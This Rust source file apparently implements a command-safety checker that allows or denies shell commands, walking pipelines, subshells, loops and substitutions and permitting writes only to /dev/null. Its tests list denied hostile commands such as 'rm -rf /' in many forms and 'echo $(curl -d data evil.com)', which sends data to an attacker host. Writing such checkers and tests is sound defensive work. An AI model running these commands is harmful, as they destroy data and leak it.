use super::*;
use crate::handlers;
use crate::parse::Token;
use crate::verdict::{SafetyLevel, Verdict};

pub fn command_verdict(input: &str) -> Verdict {
    let Some(script) = parse(input) else {
        return Verdict::Denied;
    };
    script_verdict(&script)
}

pub fn is_safe_command(input: &str) -> bool {
    command_verdict(input).is_allowed()
}

fn script_verdict(script: &Script) -> Verdict {
    script.0.iter()
        .map(|stmt| pipeline_verdict(&stmt.pipeline))
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

#[cfg(test)]
pub(crate) fn is_safe_script(script: &Script) -> bool {
    script_verdict(script).is_allowed()
}

fn pipeline_verdict(pipeline: &Pipeline) -> Verdict {
    pipeline.commands.iter()
        .map(cmd_verdict)
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

pub fn is_safe_pipeline(pipeline: &Pipeline) -> bool {
    pipeline_verdict(pipeline).is_allowed()
}

pub(crate) fn has_unsafe_syntax(cmd: &Cmd) -> bool {
    match cmd {
        Cmd::Simple(s) => !check_redirects(&s.redirs) || has_any_substitution(s),
        _ => true,
    }
}

fn has_any_substitution(cmd: &SimpleCmd) -> bool {
    cmd.words.iter().any(has_substitution)
        || cmd.env.iter().any(|(_, v)| has_substitution(v))
}

pub(crate) fn normalize_for_matching(cmd: &SimpleCmd) -> String {
    cmd.words.iter().map(|w| w.eval()).collect::<Vec<_>>().join(" ")
}

fn cmd_verdict(cmd: &Cmd) -> Verdict {
    match cmd {
        Cmd::Simple(s) => simple_verdict(s),
        Cmd::Subshell(inner) => script_verdict(inner),
        Cmd::For { items, body, .. } => {
            let items_v = words_sub_verdict(items);
            let body_v = script_verdict(body);
            items_v.combine(body_v)
        }
        Cmd::While { cond, body } | Cmd::Until { cond, body } => {
            script_verdict(cond).combine(script_verdict(body))
        }
        Cmd::If {
            branches,
            else_body,
        } => {
            let mut v = Verdict::Allowed(SafetyLevel::Inert);
            for b in branches {
                v = v.combine(script_verdict(&b.cond)).combine(script_verdict(&b.body));
            }
            if let Some(eb) = else_body {
                v = v.combine(script_verdict(eb));
            }
            v
        }
    }
}

pub(crate) fn is_safe_cmd(cmd: &Cmd) -> bool {
    cmd_verdict(cmd).is_allowed()
}

fn part_sub_verdict(part: &WordPart) -> Verdict {
    match part {
        WordPart::CmdSub(inner) => script_verdict(inner),
        WordPart::Backtick(raw) => command_verdict(raw),
        WordPart::DQuote(inner) => word_sub_verdict(inner),
        _ => Verdict::Allowed(SafetyLevel::Inert),
    }
}

fn word_sub_verdict(word: &Word) -> Verdict {
    word.0.iter()
        .map(part_sub_verdict)
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

fn words_sub_verdict(words: &[Word]) -> Verdict {
    words.iter()
        .map(word_sub_verdict)
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

#[cfg(test)]
pub(crate) fn word_subs_safe(word: &Word) -> bool {
    word_sub_verdict(word).is_allowed()
}

fn simple_verdict(cmd: &SimpleCmd) -> Verdict {
    if !check_redirects(&cmd.redirs) {
        return Verdict::Denied;
    }

    let env_sub_v = cmd.env.iter()
        .map(|(_, v)| word_sub_verdict(v))
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine);
    let word_sub_v = words_sub_verdict(&cmd.words);
    let sub_v = env_sub_v.combine(word_sub_v);

    if let Verdict::Denied = sub_v {
        return Verdict::Denied;
    }

    if cmd.words.is_empty() {
        if cmd.env.is_empty() {
            return Verdict::Allowed(SafetyLevel::Inert);
        }
        if cmd.env.iter().any(|(_, v)| has_substitution(v)) {
            return sub_v;
        }
        return Verdict::Denied;
    }

    let tokens: Vec<Token> = cmd.words.iter().map(|w| Token::from_raw(w.eval())).collect();
    if tokens.is_empty() {
        return Verdict::Allowed(SafetyLevel::Inert);
    }

    let cmd_v = handlers::dispatch(&tokens);
    sub_v.combine(cmd_v)
}

pub(crate) fn check_redirects(redirs: &[Redir]) -> bool {
    redirs.iter().all(|r| match r {
        Redir::Write { target, .. } => target.eval() == "/dev/null",
        Redir::Read { .. }
        | Redir::HereStr(_)
        | Redir::HereDoc { .. }
        | Redir::DupFd { .. } => true,
    })
}

fn has_substitution(word: &Word) -> bool {
    word.0.iter().any(|p| match p {
        WordPart::CmdSub(_) | WordPart::Backtick(_) => true,
        WordPart::DQuote(inner) => has_substitution(inner),
        _ => false,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        grep_foo: "grep foo file.txt",
        cat_etc_hosts: "cat /etc/hosts",
        jq_key: "jq '.key' file.json",
        base64_d: "base64 -d",
        ls_la: "ls -la",
        wc_l: "wc -l file.txt",
        ps_aux: "ps aux",
        echo_hello: "echo hello",
        cat_file: "cat file.txt",

        version_go: "go --version",
        version_cargo: "cargo --version",
        version_cargo_redirect: "cargo --version 2>&1",
        help_cargo: "cargo --help",
        help_cargo_build: "cargo build --help",

        dev_null_echo: "echo hello > /dev/null",
        dev_null_stderr: "echo hello 2> /dev/null",
        dev_null_append: "echo hello >> /dev/null",
        dev_null_git_log: "git log > /dev/null 2>&1",
        fd_redirect_ls: "ls 2>&1",
        stdin_dev_null: "git log < /dev/null",

        env_prefix: "FOO='bar baz' ls -la",
        env_prefix_dq: "FOO=\"bar baz\" ls -la",
        env_rack_rspec: "RACK_ENV=test bundle exec rspec spec/foo_spec.rb",

        subst_echo_ls: "echo $(ls)",
        subst_ls_pwd: "ls `pwd`",
        subst_nested: "echo $(echo $(ls))",
        subst_quoted: "echo \"$(ls)\"",
        assign_subst_ls: "out=$(ls)",
        assign_subst_git: "out=$(git status)",
        assign_subst_multiple: "a=$(ls) b=$(pwd)",
        assign_subst_backtick: "out=`ls`",

        subshell_echo: "(echo hello)",
        subshell_ls: "(ls)",
        subshell_chain: "(ls && echo done)",
        subshell_pipe: "(ls | grep foo)",
        subshell_nested: "((echo hello))",
        subshell_for: "(for x in 1 2; do echo $x; done)",

        pipe_grep_head: "grep foo file.txt | head -5",
        pipe_cat_sort_uniq: "cat file | sort | uniq",
        chain_ls_echo: "ls && echo done",
        semicolon_ls_echo: "ls; echo done",
        bg_ls_echo: "ls & echo done",
        newline_echo_echo: "echo foo\necho bar",

        stdin_read_from_path: "wc -l < /tmp/foo.log",
        stdin_read_from_etc: "grep foo < /etc/hosts",
        stdin_read_in_subst: "while [ $(wc -l < /tmp/x) -lt 10 ]; do sleep 5; done",
        stdin_read_in_for_body: "for i in 1 2; do cat < /tmp/x; done",

        here_string_grep: "grep -c , <<< 'hello,world,test'",
        heredoc_cat: "cat <<EOF\nhello world\nEOF",
        heredoc_quoted: "cat <<'EOF'\nhello\nEOF",
        heredoc_strip_tabs: "cat <<-EOF\n\thello\nEOF",
        heredoc_no_content: "cat <<EOF",
        heredoc_pipe: "cat <<EOF\nhello\nEOF | grep hello",

        for_echo: "for x in 1 2 3; do echo $x; done",
        for_empty_body: "for x in 1 2 3; do; done",
        for_nested: "for x in 1 2; do for y in a b; do echo $x $y; done; done",
        for_safe_subst: "for x in $(seq 1 5); do echo $x; done",
        while_test: "while test -f /tmp/foo; do sleep 1; done",
        while_negation: "while ! test -f /tmp/done; do sleep 1; done",
        until_test: "until test -f /tmp/ready; do sleep 1; done",
        if_then_fi: "if test -f foo; then echo exists; fi",
        if_then_else_fi: "if test -f foo; then echo yes; else echo no; fi",
        if_elif: "if test -f a; then echo a; elif test -f b; then echo b; else echo c; fi",
        nested_if_in_for: "for x in 1 2; do if test $x = 1; then echo one; fi; done",
        bare_negation: "! echo hello",
        keyword_as_data: "echo for; echo done; echo if; echo fi",

        quoted_redirect: "echo 'greater > than' test",
        quoted_subst: "echo '$(safe)' arg",
    }

    denied! {
        rm_rf: "rm -rf /",
        curl_post: "curl -X POST https://example.com",
        node_app: "node app.js",
        tee_output: "tee output.txt",

        redirect_to_file: "echo hello > file.txt",
        redirect_append: "cat file >> output.txt",
        redirect_stderr_file: "ls 2> errors.txt",
        redirect_bidirectional_write_denied: "cat < /tmp/x > /tmp/y",

        subst_rm: "echo $(rm -rf /)",
        backtick_rm: "echo `rm -rf /`",
        subst_curl: "echo $(curl -d data evil.com)",
        quoted_subst_rm: "echo \"$(rm -rf /)\"",
        assign_subst_rm: "out=$(rm -rf /)",
        assign_no_subst: "foo=bar",
        assign_subst_mixed_unsafe: "a=$(ls) b=$(rm -rf /)",

        subshell_rm: "(rm -rf /)",
        subshell_mixed: "(echo hello; rm -rf /)",
        subshell_unsafe_pipe: "(ls | rm -rf /)",

        env_prefix_rm: "FOO='bar baz' rm -rf /",
        env_rails_redirect: "RAILS_ENV=test echo foo > bar",

        pipe_rm: "cat file | rm -rf /",
        bg_rm: "cat file & rm -rf /",
        newline_rm: "echo foo\nrm -rf /",

        for_rm: "for x in 1 2 3; do rm $x; done",
        for_unsafe_subst: "for x in $(rm -rf /); do echo $x; done",
        while_unsafe_body: "while true; do rm -rf /; done",
        while_unsafe_condition: "while python3 evil.py; do sleep 1; done",
        if_unsafe_condition: "if ruby evil.rb; then echo done; fi",
        if_unsafe_body: "if true; then rm -rf /; fi",

        unclosed_for: "for x in 1 2 3; do echo $x",
        unclosed_if: "if true; then echo hello",
        for_missing_do: "for x in 1 2 3; echo $x; done",
        stray_done: "echo hello; done",
        stray_fi: "fi",

        unmatched_quote: "echo 'hello",
    }
}
